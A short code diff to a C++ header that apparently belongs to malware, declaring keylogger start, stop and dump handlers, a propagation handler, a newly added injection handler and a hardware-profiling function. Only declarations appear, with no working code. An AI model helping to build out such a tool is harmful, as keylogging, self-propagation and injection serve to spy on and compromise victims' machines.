@@ -61,6 +61,7 @@ private:
     void handleKeylogStop();
     void handleKeylogDump();
     void handlePropagation(Packet&& packet);
+    void handleInjection(Packet&& packet);
 
     // System Profiler (Gourmandise Subsystem)
     std::string getHardwareUUID();
